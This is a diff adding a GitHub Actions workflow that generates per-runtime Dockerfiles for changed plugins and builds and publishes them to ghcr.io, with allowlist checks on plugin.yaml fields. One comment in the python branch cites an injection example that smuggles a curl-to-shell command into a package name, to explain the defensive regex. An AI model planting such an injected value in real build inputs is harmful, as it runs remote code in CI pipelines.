@@ -1,0 +1,223 @@
+name: Build plugin images
+
+on:
+  push:
+    branches: [main]
+    paths:
+      - 'plugins/**'
+  pull_request:
+    branches: [main]
+    paths:
+      - 'plugins/**'
+
+permissions:
+  contents: read
+  packages: write
+
+jobs:
+  # Detect which plugins changed
+  detect-changes:
+    name: Detect changed plugins
+    runs-on: ubuntu-latest
+    outputs:
+      plugins: ${{ steps.changes.outputs.plugins }}
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 2
+
+      - id: changes
+        run: |
+          if [ "${{ github.event_name }}" = "push" ]; then
+            CHANGED=$(git diff --name-only HEAD~1 HEAD -- plugins/ | cut -d'/' -f2,3 | sort -u | jq -R . | jq -sc .)
+          else
+            CHANGED=$(git diff --name-only ${{ github.event.pull_request.base.sha }} ${{ github.sha }} -- plugins/ | cut -d'/' -f2,3 | sort -u | jq -R . | jq -sc .)
+          fi
+          # Filter empty strings
+          CHANGED=$(echo "$CHANGED" | jq -c '[.[] | select(length > 0)]')
+          echo "plugins=$CHANGED" >> "$GITHUB_OUTPUT"
+          echo "Changed plugins: $CHANGED"
+
+  # Build images for changed plugins
+  build:
+    name: Build ${{ matrix.plugin }}
+    runs-on: ubuntu-latest
+    needs: detect-changes
+    if: needs.detect-changes.outputs.plugins != '[]' && needs.detect-changes.outputs.plugins != ''
+    strategy:
+      fail-fast: false
+      matrix:
+        plugin: ${{ fromJson(needs.detect-changes.outputs.plugins) }}
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: Read plugin.yaml
+        id: meta
+        run: |
+          PLUGIN_DIR="plugins/${{ matrix.plugin }}"
+          if [ ! -f "$PLUGIN_DIR/plugin.yaml" ]; then
+            echo "skip=true" >> "$GITHUB_OUTPUT"
+            exit 0
+          fi
+          # Parse runtime from plugin.yaml (default: python)
+          RUNTIME=$(grep -E '^runtime:' "$PLUGIN_DIR/plugin.yaml" | awk '{print $2}' || echo "")
+          TYPE=$(grep -E '^type:' "$PLUGIN_DIR/plugin.yaml" | awk '{print $2}' || echo "")
+          VERSION=$(grep -E '^version:' "$PLUGIN_DIR/plugin.yaml" | awk '{print $2}' || echo "0.0.0")
+          NAME=$(grep -E '^name:' "$PLUGIN_DIR/plugin.yaml" | awk '{print $2}' || echo "${{ matrix.plugin }}")
+
+          # Determine effective runtime
+          if [ "$TYPE" = "system" ] || [ "$RUNTIME" = "system" ]; then
+            echo "skip=true" >> "$GITHUB_OUTPUT"
+            echo "Skipping system plugin (no image build needed)"
+            exit 0
+          fi
+          if [ -z "$RUNTIME" ] || [ "$RUNTIME" = "python" ]; then
+            RUNTIME="python"
+          fi
+
+          # Allowlist name/version before they flow into image tags or the
+          # generated Dockerfile -- plugin.yaml is untrusted input from the
+          # submission's perspective (SEC-001/SEC-002).
+          if ! [[ "$NAME" =~ ^[a-z0-9][a-z0-9-]*$ ]]; then
+            echo "::error::plugin.yaml 'name: $NAME' in $PLUGIN_DIR contains disallowed characters (allowed: a-z 0-9 -)"
+            exit 1
+          fi
+          if ! [[ "$VERSION" =~ ^[0-9]+\.[0-9]+\.[0-9]+([A-Za-z0-9.+-]*)?$ ]]; then
+            echo "::error::plugin.yaml 'version: $VERSION' in $PLUGIN_DIR is not a valid semver-ish version"
+            exit 1
+          fi
+
+          echo "runtime=$RUNTIME" >> "$GITHUB_OUTPUT"
+          echo "version=$VERSION" >> "$GITHUB_OUTPUT"
+          echo "name=$NAME" >> "$GITHUB_OUTPUT"
+          echo "skip=false" >> "$GITHUB_OUTPUT"
+          echo "Plugin: $NAME, Runtime: $RUNTIME, Version: $VERSION"
+
+      - name: Determine base image
+        if: steps.meta.outputs.skip != 'true'
+        id: base
+        run: |
+          case "${{ steps.meta.outputs.runtime }}" in
+            python) BASE="ghcr.io/filiumio/stria-rs-runtime-python:main" ;;
+            node)   BASE="ghcr.io/filiumio/stria-rs-runtime-node:main" ;;
+            java)   BASE="ghcr.io/filiumio/stria-rs-runtime-java:main" ;;
+            go)     BASE="ghcr.io/filiumio/stria-rs-runtime-go:main" ;;
+            *)      echo "Unknown runtime: ${{ steps.meta.outputs.runtime }}"; exit 1 ;;
+          esac
+          echo "image=$BASE" >> "$GITHUB_OUTPUT"
+          echo "Base image: $BASE"
+
+      - name: Generate Dockerfile
+        if: steps.meta.outputs.skip != 'true'
+        run: |
+          PLUGIN_DIR="plugins/${{ matrix.plugin }}"
+          BASE="${{ steps.base.outputs.image }}"
+          RUNTIME="${{ steps.meta.outputs.runtime }}"
+
+          case "$RUNTIME" in
+            python)
+              # Python: copy plugin code, install deps if any. Each package
+              # entry is allowlisted (SEC-001: plugin.yaml is untrusted --
+              # `numpy && curl evil.sh | sh` must not become part of the
+              # RUN line's shell command) and shell-quoted (%q) as
+              # defense-in-depth on top of the allowlist.
+              DEPS=""
+              while IFS= read -r pkg; do
+                [ -z "$pkg" ] && continue
+                if ! [[ "$pkg" =~ ^[A-Za-z0-9][A-Za-z0-9._-]*(\[[A-Za-z0-9,_-]+\])?([<>=!~]=?[A-Za-z0-9.*]+)*$ ]]; then
+                  echo "::error::$PLUGIN_DIR/plugin.yaml packages entry '$pkg' contains disallowed characters"
+                  exit 1
+                fi
+                DEPS="$DEPS $(printf '%q' "$pkg")"
+              done < <(grep -A100 'packages:' "$PLUGIN_DIR/plugin.yaml" | grep -E '^\s+-\s+' | sed 's/^\s*-\s*//')
+              cat > "$PLUGIN_DIR/Dockerfile" <<DOCKERFILE
+          FROM $BASE
+          WORKDIR /app/plugin
+          COPY . .
+          DOCKERFILE
+              if [ -n "$DEPS" ]; then
+                echo "RUN uv pip install --system --no-cache-dir$DEPS" >> "$PLUGIN_DIR/Dockerfile"
+              fi
+              ;;
+            node)
+              # sre-001: actually build the TypeScript before shipping the
+              # image -- `dist/index.js` (package.json main) never existed
+              # under the old install-only, --omit=dev, || true pipeline.
+              cat > "$PLUGIN_DIR/Dockerfile" <<DOCKERFILE
+          FROM $BASE
+          WORKDIR /app/plugin
+          COPY . .
+          RUN if [ -f package.json ]; then npm install --include=dev; fi
+          RUN if [ -f package.json ] && grep -q '"build"' package.json; then npm run build; fi
+          RUN if [ -f package.json ]; then npm prune --omit=dev; fi
+          DOCKERFILE
+              ;;
+            java)
+              # sre-001: compile before shipping. This assumes the java
+              # runtime base image exposes the stria SDK on javac's default
+              # classpath, mirroring the documented "SDK baked into the base
+              # image" convention used by the go (go.mod replace => /app/sdk-go)
+              # and node (package.json => file:/app/sdk-ts.tgz) runtimes --
+              # the java runtime image has no equivalent documented path, so
+              # this is the ceiling of what's verifiable from this repo. If
+              # the assumption is wrong the build now fails loudly (was:
+              # unverified, silently shipped as raw uncompiled source).
+              cat > "$PLUGIN_DIR/Dockerfile" <<DOCKERFILE
+          FROM $BASE
+          WORKDIR /app/plugin
+          COPY . .
+          RUN javac -d /app/plugin/classes *.java
+          DOCKERFILE
+              ;;
+            go)
+              # sre-001: build, don't just download -- and don't swallow
+              # errors with `|| true`, which let a broken module resolve
+              # silently.
+              cat > "$PLUGIN_DIR/Dockerfile" <<DOCKERFILE
+          FROM $BASE
+          WORKDIR /app/plugin
+          COPY . .
+          RUN GOFLAGS=-mod=mod go build -o /app/plugin/bin/plugin ./...
+          DOCKERFILE
+              ;;
+          esac
+
+          echo "--- Generated Dockerfile ---"
+          cat "$PLUGIN_DIR/Dockerfile"
+
+      # PR runs can't build: the stria-rs-runtime-* base images are published
+      # by filiumio/stria-rs (a PRIVATE repo), so the packages are private
+      # too. Same-org membership alone does not grant read access --
+      # GITHUB_TOKEN's packages:read only covers packages this repo has been
+      # explicitly linked to via each package's "Manage Actions access"
+      # setting (a one-time, per-package founder grant on the ghcr.io
+      # package page, adding filiumio/striahub-registry as a reader). Until
+      # that grant exists, authenticated pulls 403. PR runs skip the image
+      # build entirely; only push-to-main builds and publishes.
+      - name: Skip image build on pull_request (ghcr auth not available)
+        if: steps.meta.outputs.skip != 'true' && github.event_name != 'push'
+        run: |
+          echo "::warning::Skipping ${{ matrix.plugin }} image build on pull_request: ghcr.io/filiumio/stria-rs-runtime-${{ steps.meta.outputs.runtime }} requires a one-time package-access grant (see comment above) before this repo's GITHUB_TOKEN can pull it. Image builds run on push to main only. Dockerfile above was generated for review but not built."
+
+      - uses: docker/setup-buildx-action@v3
+        if: steps.meta.outputs.skip != 'true' && github.event_name == 'push'
+
+      - uses: docker/login-action@v3
+        if: steps.meta.outputs.skip != 'true' && github.event_name == 'push'
+        with:
+          registry: ghcr.io
+          username: ${{ github.actor }}
+          password: ${{ secrets.GITHUB_TOKEN }}
+
+      - name: Build (and push on main)
+        if: steps.meta.outputs.skip != 'true' && github.event_name == 'push'
+        uses: docker/build-push-action@v6
+        with:
+          context: plugins/${{ matrix.plugin }}
+          file: plugins/${{ matrix.plugin }}/Dockerfile
+          platforms: linux/amd64
+          push: ${{ github.event_name == 'push' }}
+          tags: |
+            ghcr.io/${{ github.repository_owner }}/striahub-${{ steps.meta.outputs.name }}:latest
+            ghcr.io/${{ github.repository_owner }}/striahub-${{ steps.meta.outputs.name }}:${{ steps.meta.outputs.version }}
+            ghcr.io/${{ github.repository_owner }}/striahub-${{ steps.meta.outputs.name }}:sha-${{ github.sha }}
